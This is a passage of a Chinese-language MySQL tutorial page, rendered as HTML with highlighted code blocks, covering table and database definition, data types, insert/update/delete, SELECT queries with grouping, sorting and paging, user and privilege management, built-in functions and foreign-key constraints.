class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询<br>查询所有数据库<br><span class="hljs-keyword">SHOW</span> DATABASES;<br>查询当前数据库<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DATABASE</span>()<br><br>创建<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span>[<span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span>]数据库名[<span class="hljs-keyword">DEFAULT</span> CHARSET字符集][<span class="hljs-keyword">COLLATE</span> 排序规则];<br>删除<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">DATABASE</span>[<span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span>]数据库名;<br>使用<br>USE 数据库名;<br><br>注意：[]的内容都是可选的<br></code></pre></td></tr></table></figure><h3 id="DDL-表操作-查询"><a href="#DDL-表操作-查询" class="headerlink" title="DDL-表操作-查询"></a>DDL-表操作-查询</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询当前数据库所有表<br><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">TABLES</span>;<br>查询表结构<br><span class="hljs-keyword">DESC</span> 表名;<br>查询指定表的建表语句;<br><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> 表名;<br><br>注意：前提是需要先进入该数据库即使用use 数据库名;<br></code></pre></td></tr></table></figure><h3 id="DDL-表操作-创建"><a href="#DDL-表操作-创建" class="headerlink" title="DDL-表操作-创建"></a>DDL-表操作-创建</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">CREATE <span class="hljs-selector-tag">TABLE</span> 表名(<br>字段<span class="hljs-number">1</span> 字段<span class="hljs-number">1</span>类型<span class="hljs-selector-attr">[COMMENT 字段1注释]</span>,<br>字段<span class="hljs-number">2</span> 字段<span class="hljs-number">2</span>类型<span class="hljs-selector-attr">[COMMENT 字段2注释]</span>,<br>字段<span class="hljs-number">3</span> 字段<span class="hljs-number">3</span>类型<span class="hljs-selector-attr">[COMMENT 字段3注释]</span>,<br>......<br>字段n 字段n类型<span class="hljs-selector-attr">[COMMENT 字段n注释]</span><br>)<span class="hljs-selector-attr">[COMMENT 表注释]</span>;<br><br>注意：<span class="hljs-selector-attr">[...]</span>为可选参数，最后一个字段后面没有逗号<br></code></pre></td></tr></table></figure><p>创建该表：</p><p><img src="/../image/%E8%A1%A8%E6%93%8D%E4%BD%9C-%E5%88%9B%E5%BB%BA1.png"></p><p>语法：</p><p><img src="/../image/%E8%A1%A8%E6%93%8D%E4%BD%9C-%E5%88%9B%E5%BB%BA2.png"></p><p>创建成功使用show tables查看：</p><p><img src="/../image/%E8%A1%A8%E6%93%8D%E4%BD%9C-%E5%88%9B%E5%BB%BA3.png"></p><p>可以看到tb_user已经创建成功</p><h3 id="DDL-表操作-数据类型"><a href="#DDL-表操作-数据类型" class="headerlink" title="DDL-表操作-数据类型"></a>DDL-表操作-数据类型</h3><p>MySQL中的数据类型有很多，主要分为三类：数值类型、字符串类型、日期时间类型</p><h4 id="数值类型："><a href="#数值类型：" class="headerlink" title="数值类型："></a>数值类型：</h4><p><img src="/../image/%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B.png"></p><p>DECIMALM(精度)指长度D(标度)指小数点后长度</p><p>例如：<br>age TINYINT UNSIGNED; 无符号类型 unsigned</p><p>score double(4,1)；表示长度为4，1位小数</p><h4 id="字符串类型："><a href="#字符串类型：" class="headerlink" title="字符串类型："></a>字符串类型：</h4><p><img src="/../image/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B.png"></p><p>char(x)和varchar(x)后都要带参数,表示字符串能够存储的最大字符长度</p><p>char固定长度未被赋值的取余将被空格代替,最大长度是多少就占用多少空间</p><p>varchar会根据所存储的内容去计算占用的空间，有多少字符就占用多少空间</p><p>区别：</p><p>​char()性能好</p><p>​varchar()性能较差</p><p>例如：</p><p>用户名usernamevarchar(50)不定长</p><p>性别genderchar(1)定长</p><h4 id="日期类型："><a href="#日期类型：" class="headerlink" title="日期类型："></a>日期类型：</h4><p><img src="/../image/%E6%97%A5%E6%9C%9F%E7%B1%BB%E5%9E%8B.png"></p><p>常用：DATETIMEDATETIME</p><p>样例：</p><p>使用合适的数值类型来储存数据</p><p><img src="/../image/%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B1.png"></p><p>结果：</p><p><img src="/../image/%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B2.png"></p><h3 id="DDL-表操作-修改"><a href="#DDL-表操作-修改" class="headerlink" title="DDL-表操作-修改"></a>DDL-表操作-修改</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">添加字段<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">ADD</span> 字段名 类型(长度) [<span class="hljs-keyword">COMMENT</span> 注释] [约束];<br><br>修改字段<br>修改数据类型<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 MODIFY 字段名 新数据类型(长度);<br>修改字段名和字段类型<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 CHANGE 旧字段名 新字段名 类型(长度) [<span class="hljs-keyword">COMMENT</span> 注释] [约束];<br><br>删除字段<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">DROP</span> 字段名;<br><br>修改表名<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TO</span> 新表名;<br></code></pre></td></tr></table></figure><p>添加案例：</p><p><img src="/../image/%E6%B7%BB%E5%8A%A0%E6%A1%88%E4%BE%8B.png"></p><p>修改案例：</p><p><img src="/../image/%E4%BF%AE%E6%94%B9%E6%A1%88%E4%BE%8B.png"></p><p>删除案例：<br><img src="/../image/%E5%88%A0%E9%99%A4%E6%A1%88%E4%BE%8B.png"></p><p>修改表名：<br><img src="/../image/%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D.png"></p><h3 id="DDL-表操作-删除"><a href="#DDL-表操作-删除" class="headerlink" title="DDL-表操作-删除"></a>DDL-表操作-删除</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">删除表<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> [IF <span class="hljs-keyword">EXISTS</span>] 表名;<br>删除指定表，并重新创建该表<br><span class="hljs-keyword">TRUNCATE</span> <span class="hljs-keyword">TABLE</span> 表名;等于清空这个表内的数据<br></code></pre></td></tr></table></figure><h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><h3 id="DML-添加数据"><a href="#DML-添加数据" class="headerlink" title="DML-添加数据"></a>DML-添加数据</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.给指定字段添加数据<br><span class="hljs-attribute">INSERT</span> INTO 表名 (字段名<span class="hljs-number">1</span>,字段名<span class="hljs-number">2</span>,...) VALUES (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...);<br><span class="hljs-attribute">2</span>.给全部字段添加数据<br><span class="hljs-attribute">INSERT</span> INTO 表名 VALUES (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...);<br><br><span class="hljs-attribute">3</span>.批量添加数据<br><span class="hljs-attribute">INSERT</span> INTO 表名 (字段名<span class="hljs-number">1</span>,字段名<span class="hljs-number">2</span>,...) VALUES (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...),(值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...),(值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...);<br><span class="hljs-attribute">INSERT</span> INTO 表名 VALUES (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...),(值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...),(值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...);<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>插入数据时，指定的字段顺序需要与值的顺序是一一对应的。</li><li>字符串和日期型数据应该包含在引号中。</li><li>插入的数据大小，应该在字段的规定范围内。</li></ul><h3 id="DML-修改数据"><a href="#DML-修改数据" class="headerlink" title="DML-修改数据"></a>DML-修改数据</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UPDATE</span> 表名 SET 字段名<span class="hljs-number">1</span> = 值<span class="hljs-number">1</span>,字段名<span class="hljs-number">2</span> = 值<span class="hljs-number">2</span>,...<span class="hljs-meta"> [WHERE 条件];</span><br></code></pre></td></tr></table></figure><p>案例：修改id为1的数据，将name修改为itheima</p><p><img src="/../image/DML%E4%BF%AE%E6%94%B91.png"></p><p>修改多个值：</p><p><img src="/../image/DML%E4%BF%AE%E6%94%B92.png"></p><p>注意：修改语句的条件可以有，也可以没有，如果没有条件，则会修改整张表的所有数据。</p><h3 id="DML-删除数据"><a href="#DML-删除数据" class="headerlink" title="DML-删除数据"></a>DML-删除数据</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> 表名 [<span class="hljs-keyword">WHERE</span> 条件];<br></code></pre></td></tr></table></figure><p>案例：将gender为女的数据删除</p><p><img src="/../image/DML%E5%88%A0%E9%99%A4.png"></p><p>注意：</p><ul><li>DELETE语句的条件可以有，也可以没有，如果没有条件，则会删除整张表的所有数据</li><li>DELETE语句不能删除某一个字段的值(可以使用UPDATE)。</li></ul><h2 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h2><h3 id="DQL-语法"><a href="#DQL-语法" class="headerlink" title="DQL-语法"></a>DQL-语法</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span><br>字段列表<br><span class="hljs-keyword">FROM</span><br>表名列表<br><span class="hljs-keyword">WHERE</span><br>条件列表<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span><br>分组字段列表<br><span class="hljs-keyword">HAVING</span><br>分组后条件列表<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span><br>排序字段列表<br><span class="hljs-keyword">LIMIT</span><br>分页参数<br></code></pre></td></tr></table></figure><h3 id="DQL-基本查询"><a href="#DQL-基本查询" class="headerlink" title="DQL-基本查询"></a>DQL-基本查询</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1.查询多个字段<br><span class="hljs-keyword">SELECT</span> 字段<span class="hljs-number">1</span>,字段<span class="hljs-number">2</span>,字段<span class="hljs-number">3.</span>.. <span class="hljs-keyword">FROM</span> 表名;<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> 表名;<br><br>2.设置别名<br><span class="hljs-keyword">SELECT</span> 字段<span class="hljs-number">1</span> [<span class="hljs-keyword">AS</span> 别名<span class="hljs-number">1</span>],字段<span class="hljs-number">2</span> [<span class="hljs-keyword">AS</span> 别名<span class="hljs-number">2</span>] ... <span class="hljs-keyword">FROM</span> 表名;<br><br>3.去除重复记录<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表名;<br></code></pre></td></tr></table></figure><p>案例：</p><p>1.查询指定字段 name,workno,age返回</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,workno,age <span class="hljs-keyword">from</span> emp;<br></code></pre></td></tr></table></figure><p>2.查询所有字段返回</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> id,workno,<span class="hljs-type">name</span>,gender,age,idcard,workaddress,entrydate <span class="hljs-keyword">from</span> emp;<br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp;也用通配符*查询所有字段<br></code></pre></td></tr></table></figure><p>3.查询所有员工的工作地址，起别名</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> workaddress <span class="hljs-keyword">as</span> <span class="hljs-string">&#x27;工作地址&#x27;</span> <span class="hljs-keyword">from</span> emp;<br> <br><span class="hljs-keyword">as</span>也可省略，效果一致<br><span class="hljs-keyword">select</span> workaddress <span class="hljs-string">&#x27;工作地址&#x27;</span> <span class="hljs-keyword">from</span> emp;<br></code></pre></td></tr></table></figure><p>4.查询公司员工的上班地址(不要重复)</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">关键词：<span class="hljs-keyword">distinct</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> workaddress <span class="hljs-string">&#x27;工作地址&#x27;</span> <span class="hljs-keyword">from</span> emp<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><h3 id="DQL-条件查询-WHERE"><a href="#DQL-条件查询-WHERE" class="headerlink" title="DQL-条件查询(WHERE)"></a>DQL-条件查询(WHERE)</h3><p>1.语法：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表名 <span class="hljs-keyword">WHERE</span> 条件列表;<br></code></pre></td></tr></table></figure><p>2.条件：</p><p><img src="/../image/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2-%E6%9D%A1%E4%BB%B6.png"></p><p>注意：</p><p>1.如果要查的值是null不能用 where 字段列表 &#x3D; null 而是 where 字段列表 is null</p><p>如果要查不是null的值,要用where 字段列表 is not null</p><p>2.如果用了between..and…语句 注意范围</p><p>3.注意IN()和LIKE的用法：</p><p>LIKE的占位符：_表示匹配单个字符,%表示匹配任意个字符</p><p>例如查找姓名为两个字符的员工：select * from emp where name like ‘–’;</p><h3 id="DQL-聚合函数"><a href="#DQL-聚合函数" class="headerlink" title="DQL-聚合函数"></a>DQL-聚合函数</h3><p>介绍：将<strong>一列数据</strong>作为一个整体，进行纵向计算</p><p>常见聚合函数：</p><p><img src="/../image/%E5%B8%B8%E8%A7%81%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0.png"></p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">SELECT</span> 聚合函数(字段列表) <span class="hljs-selector-tag">FROM</span> 表名;<br></code></pre></td></tr></table></figure><p>例如：统计西安地区员工的年龄之和</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">sum</span>(age) <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">where</span> workaddress = <span class="hljs-string">&#x27;西安&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>注意：null值不参与所有聚合函数运算</strong></p><h3 id="DQL-分组查询-GROUP-BY"><a href="#DQL-分组查询-GROUP-BY" class="headerlink" title="DQL-分组查询(GROUP BY)"></a>DQL-分组查询(GROUP BY)</h3><p>语法：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表名 [<span class="hljs-keyword">WHERE</span> 条件] <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> 分组字段名 [<span class="hljs-keyword">HAVING</span> 分组后过滤条件];<br></code></pre></td></tr></table></figure><p>where与having的区别：</p><ul><li>执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组之后对结果进行过滤</li><li>判断条件不同：where不能对聚合函数进行判断，而having可以。</li></ul><p>例如：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">根据性别分组，统计男性员工 和 女性员工的数量<br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br>根据性别分组，统计男性员工 和 女性员工的平均年龄<br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br>查询年龄小于45的员工，并根据工作地址分组，获取员工数量大于等于3的工作地址<br><span class="hljs-keyword">select</span> workaddress,<span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">where</span> age &lt; <span class="hljs-number">45</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> workaddress <span class="hljs-keyword">having</span> <span class="hljs-built_in">count</span>(*) &gt;= <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>执行顺序：where &gt; 聚合函数 &gt; having。</li><li>分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义</li></ul><h3 id="DQL-排序查询-ORDER-BY"><a href="#DQL-排序查询-ORDER-BY" class="headerlink" title="DQL-排序查询(ORDER BY)"></a>DQL-排序查询(ORDER BY)</h3><p>语法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SELECT</span> 字段列表 FROM 表名 ORDER BY 字段<span class="hljs-number">1</span> 排序方式<span class="hljs-number">1</span>,字段<span class="hljs-number">2</span> 排序方式<span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p><strong>排序方式：</strong></p><ul><li>ASC：升序（默认值）</li><li>DESC：降序</li></ul><p><strong>注意：</strong></p><ul><li>如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序</li><li>ASC可省略</li></ul><p> 例如：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">根据年龄对公司的员工进行升序排序，如果年龄相同，再按照入职时间进行降序排序<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age <span class="hljs-keyword">asc</span>,entrydate <span class="hljs-keyword">desc</span>;<br></code></pre></td></tr></table></figure><h3 id="DQL-分页查询-LIMIT"><a href="#DQL-分页查询-LIMIT" class="headerlink" title="DQL-分页查询(LIMIT)"></a>DQL-分页查询(LIMIT)</h3><p>语法：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表名 <span class="hljs-keyword">LIMIT</span> 起始索引,查询记录数;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>起始索引从0开始，起始索引&#x3D;（查询页码-1）* 每页显示记录数</li><li>分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中是LIMIT</li><li>如果查询的是第一页数据，起始索引可以省略，直接简写为 limit 10</li></ul><h3 id="DQL-执行顺序"><a href="#DQL-执行顺序" class="headerlink" title="DQL-执行顺序"></a>DQL-执行顺序</h3><p>执行顺序：</p><p><img src="/../image/DQL%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F.png"></p><p>序号为执行顺序，语法为编写顺序</p><h2 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h2><p>介绍：用来管理数据库用户、控制数据库的访问权限。</p><h3 id="DCL-管理用户"><a href="#DCL-管理用户" class="headerlink" title="DCL-管理用户"></a>DCL-管理用户</h3><p>语法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询用户<br>USE mysql;<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span>;<br><br>创建用户<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;密码&#x27;</span>;<br><br>修改用户密码<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;新密码&#x27;</span>;<br><br>删除用户<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span>;<br></code></pre></td></tr></table></figure><p>如果要让用户在任意主机访问该数据库只需要在创建用户时，主机名输入%</p><p>注意：</p><ul><li>主机名可以使用%通配</li><li>这类SQL开发人员操作的比较少，主要是DBA(数据库管理员)使用</li></ul><h3 id="DCL-权限控制"><a href="#DCL-权限控制" class="headerlink" title="DCL-权限控制"></a>DCL-权限控制</h3><p>MySQL中定义了很多权限，以下是常用的一些权限：</p><p><img src="/../image/%E5%B8%B8%E7%94%A8%E6%9D%83%E9%99%90.png"></p><p>语法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询权限<br><span class="hljs-keyword">SHOW</span> GRANTS <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span>;<br><br>授予权限<br><span class="hljs-keyword">GRANT</span> 权限列表 <span class="hljs-keyword">ON</span> 数据库名.表名 <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span>;<br><br>撤销权限<br><span class="hljs-keyword">REVOKE</span> 权限列表 <span class="hljs-keyword">ON</span> 数据库名.表名 <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机名&#x27;</span>;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>多个权限之间，使用逗号分隔</li><li>授权时，数据库名和表名可以使用*进行通配，代表所有。</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><p>MySQL内置的常用字符串函数：<br><img src="/../image/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0.png"></p><p>例如：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span> emp <span class="hljs-keyword">set</span> workno = lpad(workno,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;0&#x27;</span>);<br></code></pre></td></tr></table></figure><p>注意：substring函数截取字符串索引是从1开始的</p><h3 id="数值函数"><a href="#数值函数" class="headerlink" title="数值函数"></a>数值函数</h3><p>常用的数值函数：</p><p><img src="/../image/%E6%95%B0%E5%80%BC%E5%87%BD%E6%95%B0.png"></p><p>例如：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less">通过数据库的函数，生成一个六位数的随机验证码<br><span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">lpad</span>(<span class="hljs-built_in">round</span>(<span class="hljs-built_in">rand</span>()*<span class="hljs-number">1000000</span>,<span class="hljs-number">0</span>),<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;0&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><p><img src="/../image/%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0.png"></p><h3 id="流程函数"><a href="#流程函数" class="headerlink" title="流程函数"></a>流程函数</h3><p><img src="/../image/%E6%B5%81%E7%A8%8B%E5%87%BD%E6%95%B0.png"></p><h2 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h2><p>概念：约束是作用于表中字段上的规则，用于限制存储在表中的数据</p><p>目的：保证数据库中数据的正确，有效性和完整性。</p><p>分类：</p><p><img src="/../image/%E7%BA%A6%E6%9D%9F.png"></p><p>注意：约束是作用于表中字段上的，可以在创建表&#x2F;修改表的时候添加约束</p><p>实现主键的自增长可使用<code>auto_increment</code></p><h3 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h3><p>概念：外键用来让两张表的数据之间建立连接，从而保证数据的一致性和完整性。</p><p>语法：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sas">添加外键<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> 表名(<br>字段名 数据类型,<br>...<br>[CONSTRAINT] [外键名称] <span class="hljs-keyword">FOREIGN</span> <span class="hljs-keyword">KEY</span>(外键字段名) <span class="hljs-keyword">REFERENCES</span> 主表(主表列名)<br>);<br><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">ADD</span> CONSTRAINT 外键名称 <span class="hljs-keyword">FOREIGN</span> <span class="hljs-keyword">KEY</span>(外键字段名) <span class="hljs-keyword">REFERENCES</span> 主表(主表字段名);<br><br>删除外键<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">FOREIGN</span> <span class="hljs-keyword">KEY</span> 外键名称;<br></code></pre></td></tr></table></figure><h3 id="外键删除-更新行为"><a href="#外键删除-更新行为" class="headerlink" title="外键删除&#x2F;更新行为"></a>外键删除&#x2F;更新行为</h3><p><img src="/../image/%E5%A4%96%E9%94%AE%E5%88%A0%E9%99%A4%E6%9B%B4%E6%96%B0.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> 表名 <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">CONSTRAINT</span> 外键名称 <span class="hljs-keyword">FOREIGN KEY</span> (外键字段) <span class="hljs-keyword">REFERENCES</span> 主表名(主表字段名) <span class="hljs-keyword">ON</span> <span 